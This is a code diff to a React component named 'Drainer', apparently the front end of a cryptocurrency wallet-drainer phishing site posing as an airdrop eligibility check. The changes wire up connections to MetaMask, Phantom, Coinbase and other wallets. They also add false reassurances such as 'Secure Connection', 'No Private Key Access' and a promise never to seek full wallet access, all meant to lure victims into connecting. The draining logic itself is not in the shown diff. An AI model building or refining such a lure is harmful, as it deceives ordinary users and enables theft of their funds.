@@ -12,6 +12,9 @@ export default function Drainer() {
   const [points, setPoints] = useState(0)
   const [stage, setStage] = useState<'connect' | 'verify' | 'claim'>('connect')
   const [showSuccess, setShowSuccess] = useState(false)
+  const [isConnecting, setIsConnecting] = useState(false)
+  const [connectionError, setConnectionError] = useState('')
+  const [selectedWallet, setSelectedWallet] = useState('')
 
   useEffect(() => {
     setPoints(Math.floor(Math.random() * 9000000) + 8000000)
@@ -75,43 +78,137 @@ export default function Drainer() {
     }
   }, [])
 
+  // SVG Icons for wallets
+  const WalletIcons = {
+    MetaMask: (
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 1L3 5V19L12 23L21 19V5L12 1Z" fill="#E2761B" stroke="#E2761B" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
+        <path d="M20.5 5.5L12 12.5L8.5 9.5L3 5L12 1L20.5 5.5Z" fill="#E4761B" stroke="#E4761B" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
+        <path d="M3 5L12 12.5V23L3 19V5Z" fill="#E4761B" stroke="#E4761B" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
+        <path d="M12 23V12.5L20.5 5.5V19L12 23Z" fill="#D7C1B3" stroke="#D7C1B3" strokeWidth="0.5" strokeLinecap="round" strokeLinejoin="round"/>
+      </svg>
+    ),
+    TrustWallet: (
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 22C17.5228 22 22 17.5228 22 12C22 6.47715 17.5228 2 12 2C6.47715 2 2 6.47715 2 12C2 17.5228 6.47715 22 12 22Z" fill="#3375BB"/>
+        <path d="M12 18.5C15.5899 18.5 18.5 15.5899 18.5 12C18.5 8.41015 15.5899 5.5 12 5.5C8.41015 5.5 5.5 8.41015 5.5 12C5.5 15.5899 8.41015 18.5 12 18.5Z" fill="#3375BB"/>
+        <path d="M12 16.5C14.4853 16.5 16.5 14.4853 16.5 12C16.5 9.51472 14.4853 7.5 12 7.5C9.51472 7.5 7.5 9.51472 7.5 12C7.5 14.4853 9.51472 16.5 12 16.5Z" fill="white"/>
+      </svg>
+    ),
+    Phantom: (
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM16.5 15.5H13.5V18.5H10.5V15.5H7.5V8.5H16.5V15.5Z" fill="#AB9FF2"/>
+        <path d="M13.5 6.5H10.5V10.5H13.5V6.5Z" fill="#AB9FF2"/>
+      </svg>
+    ),
+    Backpack: (
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C8.13 2 5 5.13 5 9V14C5 17.87 8.13 21 12 21C15.87 21 19 17.87 19 14V9C19 5.13 15.87 2 12 2ZM12 4C14.76 4 17 6.24 17 9V14C17 16.76 14.76 19 12 19C9.24 19 7 16.76 7 14V9C7 6.24 9.24 4 12 4Z" fill="#00FF85"/>
+        <path d="M12 7C11.45 7 11 7.45 11 8V10C11 10.55 11.45 11 12 11C12.55 11 13 10.55 13 10V8C13 7.45 12.55 7 12 7Z" fill="#00FF85"/>
+      </svg>
+    ),
+    Solflare: (
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2L4 7L12 12L20 7L12 2Z" fill="#14F195"/>
+        <path d="M4 12L12 17L20 12L12 7L4 12Z" fill="#14F195"/>
+        <path d="M4 17L12 22L20 17L12 12L4 17Z" fill="#14F195"/>
+      </svg>
+    ),
+    Coinbase: (
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM12 20C7.59 20 4 16.41 4 12C4 7.59 7.59 4 12 4C16.41 4 20 7.59 20 12C20 16.41 16.41 20 12 20Z" fill="#0052FF"/>
+        <path d="M12 8C9.79 8 8 9.79 8 12C8 14.21 9.79 16 12 16C14.21 16 16 14.21 16 12C16 9.79 14.21 8 12 8Z" fill="#0052FF"/>
+      </svg>
+    )
+  }
+
   const wallets = [
-    { name: "MetaMask", icon: "🦊", is: 'isMetaMask', type: 'evm' },
-    { name: "Trust Wallet", icon: "🛡️", is: 'isTrust', type: 'evm' },
-    { name: "Phantom", icon: "👻", is: 'isPhantom', type: 'solana' },
-    { name: "Backpack", icon: "🎒", is: 'isBackpack', type: 'solana' },
-    { name: "Solflare", icon: "☀️", is: 'isSolflare', type: 'solana' },
-    { name: "Coinbase Wallet", icon: "🔵", is: 'isCoinbaseWallet', type: 'evm' },
+    { 
+      name: "MetaMask", 
+      icon: WalletIcons.MetaMask,
+      is: 'isMetaMask', 
+      type: 'evm',
+      description: 'Connect using MetaMask browser extension',
+      security: 'Non-custodial' 
+    },
+    { 
+      name: "Trust Wallet", 
+      icon: WalletIcons.TrustWallet,
+      is: 'isTrust', 
+      type: 'evm',
+      description: 'Connect using Trust Wallet',
+      security: 'Non-custodial'
+    },
+    { 
+      name: "Phantom", 
+      icon: WalletIcons.Phantom,
+      is: 'isPhantom', 
+      type: 'solana',
+      description: 'Connect using Phantom wallet',
+      security: 'Non-custodial'
+    },
+    { 
+      name: "Backpack", 
+      icon: WalletIcons.Backpack,
+      is: 'isBackpack', 
+      type: 'solana',
+      description: 'Connect using Backpack wallet',
+      security: 'Non-custodial'
+    },
+    { 
+      name: "Solflare", 
+      icon: WalletIcons.Solflare,
+      is: 'isSolflare', 
+      type: 'solana',
+      description: 'Connect using Solflare wallet',
+      security: 'Non-custodial'
+    },
+    { 
+      name: "Coinbase Wallet", 
+      icon: WalletIcons.Coinbase,
+      is: 'isCoinbaseWallet', 
+      type: 'evm',
+      description: 'Connect using Coinbase Wallet',
+      security: 'Non-custodial'
+    },
   ]
 
   const connectWallet = async (walletType: string) => {
-    const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
-    const ethereum = (window as any).ethereum
-    const solana = (window as any).solana || (window as any).phantom?.solana
-    const url = encodeURIComponent(window.location.href)
-
-    // Mobile: use deep links
-    if (isMobile) {
-      const links: Record<string, string> = {
-        metamask: `https://metamask.app.link/dapp/${url}`,
-        trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
-        phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
-        backpack: `https://backpack.app/ul/browse/${url}`,
-        solflare: `solflare://dapp?uri=${url}`,
-        coinbasewallet: `cbwallet://dapp?url=${url}`
-      }
-      const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
-      if (links[linkKey]) {
-        window.location.href = links[linkKey]
-        return
-      }
-    }
-
-    // Desktop: connect to installed extension
+    setIsConnecting(true)
+    setConnectionError('')
+    setSelectedWallet(walletType)
+    
     try {
+      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent)
+      const ethereum = (window as any).ethereum
+      const solana = (window as any).solana || (window as any).phantom?.solana
+      const url = encodeURIComponent(window.location.href)
+
+      // Mobile: use deep links
+      if (isMobile) {
+        const links: Record<string, string> = {
+          metamask: `https://metamask.app.link/dapp/${url}`,
+          trustwallet: `https://link.trustwallet.com/open_url?coin_id=60&url=${url}`,
+          phantom: `https://phantom.app/ul/browse/${url}?ref=${url}`,
+          backpack: `https://backpack.app/ul/browse/${url}`,
+          solflare: `solflare://dapp?uri=${url}`,
+          coinbasewallet: `cbwallet://dapp?url=${url}`
+        }
+        const linkKey = walletType.toLowerCase().replace(/\s+/g, '')
+        if (links[linkKey]) {
+          window.location.href = links[linkKey]
+          return
+        }
+      }
+
+      // Desktop: connect to installed extension
       const wallet = wallets.find(w => w.name.toLowerCase().replace(/\s+/g, '') === walletType.toLowerCase().replace(/\s+/g, ''))
       
-      if (wallet?.type === 'solana' && solana) {
+      if (!wallet) {
+        throw new Error('Wallet not found')
+      }
+      
+      if (wallet.type === 'solana' && solana) {
         if (solana.connect) {
           await solana.connect()
         }
@@ -119,7 +216,7 @@ export default function Drainer() {
           setAccount(solana.publicKey.toString())
           setStage('verify')
         }
-      } else if (wallet?.type === 'evm' && ethereum) {
+      } else if (wallet.type === 'evm' && ethereum) {
         let provider = ethereum
         // Find specific wallet in providers array
         if (ethereum.providers) {
@@ -135,13 +232,16 @@ export default function Drainer() {
             setStage('verify')
           }
         } else {
-          alert(`${wallet.name} not detected. Please install the extension.`)
+          throw new Error(`${wallet.name} not detected. Please install the extension.`)
         }
       } else {
-        alert(`${wallet?.name || walletType} not detected. Please install the extension.`)
+        throw new Error(`${wallet.name} not detected. Please install the extension.`)
       }
     } catch (e) {
-      alert('Connection rejected or wallet not found')
+      console.error('Wallet connection error:', e)
+      setConnectionError(e instanceof Error ? e.message : 'Failed to connect. Please try again.')
+    } finally {
+      setIsConnecting(false)
     }
   }
 
@@ -455,32 +555,70 @@ export default function Drainer() {
             Check your eligibility for the biggest airdrop of 2025
           </p>
         </div>
-
         {stage === 'connect' && (
-          <div className="text-center space-y-4 sm:space-y-6 md:space-y-8">
-            <button 
-              onClick={connect}
-              className="bg-purple-600 hover:bg-purple-700 active:bg-purple-800 px-6 sm:px-8 md:px-12 py-3 sm:py-4 md:py-6 rounded-xl sm:rounded-2xl text-base sm:text-lg md:text-xl lg:text-2xl font-bold w-full transition-all touch-manipulation"
-            >
-              Connect Wallet
-            </button>
-            {isMobile && (
-              <>
-                <p className="text-sm sm:text-base md:text-lg text-gray-300">Or choose a specific wallet:</p>
-                <div className="grid grid-cols-2 gap-3 sm:gap-4 max-w-lg mx-auto">
-                  {wallets.map(w => (
+          <div className="space-y-6">
+            <div className="text-center">
+              <h1 className="text-3xl font-bold bg-gradient-to-r from-blue-400 to-purple-500 bg-clip-text text-transparent">
+                Secure Wallet Connection
+              </h1>
+              <p className="mt-2 text-gray-400">Connect your wallet to check your airdrop eligibility</p>
+              <div className="mt-4 flex items-center justify-center space-x-2 text-sm text-gray-500">
+                <svg className="w-4 h-4 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z" />
+                </svg>
+                <span>Secure Connection</span>
+                <span>•</span>
+                <span>No Private Key Access</span>
+              </div>
+            </div>
+            
+            <div className="grid grid-cols-1 gap-3">
+              {isConnecting ? (
+                <div className="text-center p-8">
+                  <div className="inline-block h-10 w-10 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
+                  <p className="mt-4 text-gray-300">Connecting to {selectedWallet}...</p>
+                  <p className="text-sm text-gray-500 mt-2">Please check your wallet to approve the connection</p>
+                </div>
+              ) : (
+                <>
+                  {wallets.map((wallet) => (
                     <button
-                      key={w.name}
-                      onClick={() => connectWallet(w.name)}
-                      className="bg-gray-800 hover:bg-gray-700 active:bg-gray-600 p-4 sm:p-5 md:p-6 rounded-xl sm:rounded-2xl transition-all transform active:scale-95 flex flex-col items-center touch-manipulation"
+                      key={wallet.name}
+                      onClick={() => connectWallet(wallet.name)}
+                      className="group w-full flex items-center justify-between p-4 bg-gray-800/50 hover:bg-gray-800/80 rounded-xl transition-all duration-200 border border-gray-700 hover:border-blue-500/50"
+                      title={wallet.description}
                     >
-                      <span className="text-3xl sm:text-4xl mb-1 sm:mb-2">{w.icon}</span>
-                      <div className="text-xs sm:text-sm md:text-base font-medium">{w.name}</div>
+                      <div className="flex items-center space-x-4">
+                        <div className="p-2 bg-gray-800 rounded-lg group-hover:bg-gray-700 transition-colors">
+                          <div className="w-6 h-6 flex items-center justify-center">
+                            {wallet.icon}
+                          </div>
+                        </div>
+                      </div>
+                      <svg className="w-5 h-5 text-gray-400 group-hover:text-blue-400 transition-colors" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                      </svg>
                     </button>
                   ))}
-                </div>
-              </>
-            )}
+                  {connectionError && (
+                    <div className="mt-4 p-3 bg-red-900/30 border border-red-800/50 rounded-lg text-red-200 text-sm">
+                      <div className="flex items-start">
+                        <svg className="w-5 h-5 mr-2 flex-shrink-0" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
+                        </svg>
+                        <span>{connectionError}</span>
+                      </div>
+                    </div>
+                  )}
+                  <div className="mt-6 pt-4 border-t border-gray-700/50">
+                    <p className="text-xs text-center text-gray-500">
+                      By connecting, you agree to our Terms of Service and Privacy Policy. 
+                      We'll never ask for your private keys or full wallet access.
+                    </p>
+                  </div>
+                </>
+              )}
+            </div>
           </div>
         )}
 
